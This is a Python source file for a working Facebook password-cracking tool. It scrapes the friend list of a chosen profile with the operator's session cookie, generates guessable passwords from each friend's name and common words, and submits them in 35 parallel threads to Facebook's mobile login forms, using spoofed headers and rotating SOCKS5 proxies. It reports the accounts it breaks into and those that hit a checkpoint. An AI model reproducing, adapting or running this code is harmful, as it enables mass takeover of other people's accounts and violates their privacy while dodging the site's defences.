import colorama,os,json,re,time
from colorama import Style,Fore,Back
import requests,asyncio,random
from concurrent.futures import ThreadPoolExecutor as executor
from bs4 import BeautifulSoup as parser

colorama.init(True)

loop = 0
data,succ,die = [],0,0

def brute_force(data,method,username,pw):
    global loop,succ,die
    print(f"\r(•) Cracking {loop}/{len(data)} succ-{succ} die-{die}",end="")
    for password in pw:
        if ( "free" in method ):
            url = "https://free.facebook.com"
            url_login = "https://free.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8"
            try:
                with requests.Session() as res:
                    header = {'Host': 'free.facebook.com','dnt': '1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Linux; Android 10; CPH2179) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'none','sec-fetch-mode':'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
                    header_login = {'Host': 'free.facebook.com','content-length': '160','cache-control': 'max-age=0','origin': 'https://free.facebook.com','upgrade-insecure-requests': '1','dnt': '1','content-type': 'application/x-www-form-urlencoded','user-agent': 'Mozilla/5.0 (Linux; Android 10; CPH2179) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://free.facebook.com/','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
                    resp = res.get(url,headers=header).text
                    data= {'lsd': re.search(r'name="lsd" value="(.*?)"',str(resp))[1],'jazoest': re.search(r'name="jazoest" value="(.*?)"',str(resp))[1],'m_ts': re.search(r'name="m_ts" value="(.*?)"',str(resp))[1],'li': re.search(r'name="li" value="(.*?)"',str(resp))[1],'try_number': '0','unrecognized_tries': '0','email': username,'pass': password,'login': 'Masuk','bi_xrwh': '0'}
                    log = res.post(url_login,headers=header_login,data=data)
                    if ( "c_user" in res.cookies.get_dict() ):
                        print(f"(✓) {username} | {password}")
                        succ+=1
                        break
                    elif ( "checkpoint" in res.cookies.get_dict() ):
                        print(f"(*) {username} | {password}")
                        die+=1
                        break
                    else:
                        continue
            except: pass

        else:
            proxy = open("./storage/proxy.text","r").read().splitlines()
            url = method
            url_login = "https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8"
            try:
                with requests.Session() as res:
                    header = {'Host': 'mbasic.facebook.com','sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','dnt': '1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Linux; Android 10; CPH2179) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'none','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
                    header_login = {'Host': 'mbasic.facebook.com','content-length': '165','cache-control': 'max-age=0','sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','origin': 'https://mbasic.facebook.com','dnt': '1','upgrade-insecure-requests': '1','content-type': 'application/x-www-form-urlencoded','user-agent': 'Mozilla/5.0 (Linux; Android 10; CPH2179) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://mbasic.facebook.com/','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
                    resp = res.get(url,headers=header).text
                    data = {'lsd': re.search(r'name="lsd" value="(.*?)"',str(resp))[1],'jazoest': re.search(r'name="jazoest" value="(.*?)"',str(resp))[1],'m_ts': re.search(r'name="m_ts" value="(.*?)"',str(resp))[1],'li': re.search(r'name="li" value="(.*?)"',str(resp))[1],'try_number': '0','unrecognized_tries': '0','email': username,'pass': password,'login': 'Masuk','bi_xrwh': '0'}
                    log = res.post(url_login,headers=header_login,data=data,proxies={'socks5': random.choice(proxy)})
                    if ( "c_user" in res.cookies.get_dict() ):
                        print(f"(✓) {username} | {password}")
                        succ+=1
                        break
                    elif ( "checkpoint" in res.cookies.get_dict() ):
                        print(f"(*) {username} | {password}")
                        die+=1
                        break
                    else:
                        continue
            except: pass
    loop+=1



async def get_teman(method,url,cookie):
    global data
    with requests.Session() as res:
        RESP = res.get(method+url,headers={"cookie": cookie})
        try:
            for friend in re.findall(r'style="vertical-align: middle"><a class=".." href="(.*?)">(.*?)</a',str(RESP.text)):
                if ( "/profile.php" in friend[0] ):
                    uid = re.search(r'\/profile.php\?id\=([0-9]*)',str(friend[0]))[1]
                    name = friend[1].lower()
                    data.append(uid+"-"+name)
                else:
                    uid = re.search(r'\/(.*?)\?',str(friend[0]))[1]
                    name = friend[1].lower()
                    data.append(uid+"-"+name)
            print(
                    f"{Style.BRIGHT}{Fore.BLUE}!{Fore.RESET} Sedang Mengumpulkan {Fore.YELLOW}{len(data)}{Fore.RESET} username dan id",end="\r"
                    )
        except:
            exit(
                    "! problem signal"
                    )
        if ( "Lihat Teman Lain" in RESP.text ):
            url_lain = re.search(r'<a href="(.*?)"><span>Lihat Teman Lain',str(RESP.text))[1]
            await get_teman(method,url_lain,cookie)
        else:
            print(
                    f"\n{Fore.GREEN}✓{Fore.RESET} total: {len(data)}"
                    )
    print("• -----------------------------------\n")
    with executor(max_workers=35) as ex:
        for data_account in data:
            username,name = data_account.split("-")
            passoword = name.split(" ")
            pw = [passoword[0]+"123",passoword[0]+"1234",passoword[0]+"123456",name,"bismillah","123456","sayang"]
            ex.submit(brute_force,(data),(method),(username),(pw))
    exit("\n! > Cracking Finish")

def home_app(cookie,method):
    cookie,method = open(cookie,"r").read(),open(method,"r").read()

    if ( len(method) == 0 ):
        login_facebook("./storage/method.txt")

    else:
        try:
            with requests.Session() as res:
                RESP = res.get(
                        method,headers={"cookie": cookie }
                        )
                if ( "mbasic_logout_button" in str( RESP.text ) ):
                    PROFILE = res.get(
                            method+"/profile.php",headers={"cookie": cookie }
                            )
                    NAME = re.search(r'title>(.*?)</title',str(PROFILE.text))[1]
                    UID = re.search(r'name="target" value="(.*?)"',str(PROFILE.text))[1]
                else:
                    login_facebook("./storage/method.txt")
        except Exception as identifier:
            exit(identifier)
    os.system("cls" if os.name=="nt" else "clear")
    print(f"""{Style.BRIGHT}
     _____  ____   _____ 
    |     ||    \ |     | | FACEBOOK BRUTE FORCE
    |   __||  o  )|   __| | {Fore.RED}AUTHOR: RAFIKHALBI{Fore.RESET}
    |  |_  |     ||  |_   |
    |   _] |  O  ||   _]  | {Fore.GREEN}{UID}{Fore.RESET} | {Fore.GREEN}{NAME}{Fore.RESET}
    |  |   |     ||  |    |
    |__|   |_____||__|     {"-"*40}
          """)
    print(
            f"\n* Type \"{Fore.YELLOW}change{Fore.RESET}\" for change method\n{Fore.GREEN}!{Fore.RESET} Paste Username/id facebook"
            )
    TARGET = input(
            f"\n{Fore.YELLOW}?{Fore.RESET} > "
            )
    if ( TARGET.isdigit() ):
        target = method+"/profile.php?id="+TARGET
    elif (re.search('change',str(TARGET)) ):
        select_method("./method.json")
    else:
        target = method+"/"+TARGET

    with requests.Session() as res:
        GETPROFILE = parser(
                res.get(target,headers={"cookie": cookie}).text,"html.parser"
                )
        try:
            for teman in GETPROFILE.find_all("a",string="Teman"):
                url = teman["href"]
                asyncio.run(get_teman(method,url,cookie))
        except Exception as e:
            exit(e)


def login_facebook(file):
    os.system("cls" if os.name=="nt" else "clear")
    print("""    
     ___      _______  _______  ___   __    _ 
    |   |    |       ||       ||   | |  |  | |
    |   |    |   _   ||    ___||   | |   |_| |
    |   |    |  | |  ||   | __ |   | |       |
    |   |___ |  |_|  ||   ||  ||   | |  _    |
    |       ||       ||   |_| ||   | | | |   |
    |_______||_______||_______||___| |_|  |__|

          """)
    CHECK = open(file,"r").read()
    if ( CHECK == "" or len( CHECK ) == 0 ):
        print(
                f"{Fore.RED}!{Fore.RESET} not method detected"
                ); time.sleep(1)
        select_method("./method.json")
        login_facebook("./storage/method.txt")
    elif ( len( CHECK ) != 0):
        print(
                f"{Fore.RED}!{Fore.RESET} paste your facebook cookies here"
                )
        COOKIE = input(
                f"{Fore.YELLOW}?{Fore.RESET} > {Fore.GREEN}"
                )
        try:
            with requests.Session() as res:
                RESP = res.get(
                        CHECK,headers={"cookie": COOKIE}
                        )
                if ( "mbasic_logout_button" in str( RESP.text ) ):
                    print(
                            "✓ Succes Login"
                            ); time.sleep(1)
                    open("./storage/cookies.txt","w").write(COOKIE);home_app("./storage/cookies.txt","./storage/method.txt")
                else:
                    print("! Gagal Login")
        except Exception as identifier:
            pass

def select_method(file,method = []):
    os.system("cls" if os.name=="nt" else "clear")
    PARS = json.loads(open(file,"r").read())
    print("""
     __   __  _______  _______  __   __  _______  ______  
    |  |_|  ||       ||       ||  | |  ||       ||      | 
    |       ||    ___||_     _||  |_|  ||   _   ||  _    |
    |       ||   |___   |   |  |       ||  | |  || | |   |
    |       ||    ___|  |   |  |       ||  |_|  || |_|   |
    | ||_|| ||   |___   |   |  |   _   ||       ||       |
    |_|   |_||_______|  |___|  |__| |__||_______||______| 
    """)
    print(
            f"{Style.BRIGHT}{Fore.GREEN}1{Fore.RESET} > Mbasic Facebook ({Fore.BLUE}without internet connection{Fore.RESET})\n{Fore.GREEN}2{Fore.RESET} > Free Facebook ({Fore.BLUE}using an internet connection{Fore.RESET})"
            )
    CURSOR = input(
            f"\n{Fore.YELLOW}?{Fore.RESET} > "
            )
    if ( "1" in CURSOR ): method.append(PARS["mbasic"])
    elif ( "2" in CURSOR ): method.append(PARS["free"])
    else:
        exit(
                f"{Fore.RED}!{Fore.RESET} > Incorrect input"
                )
    open("./storage/method.txt","w").write("".join(method))

if __name__ == "__main__":
    # select_method("./method.json")
    # login_facebook("./storage/method.txt")
    home_app("./storage/cookies.txt","./storage/method.txt")
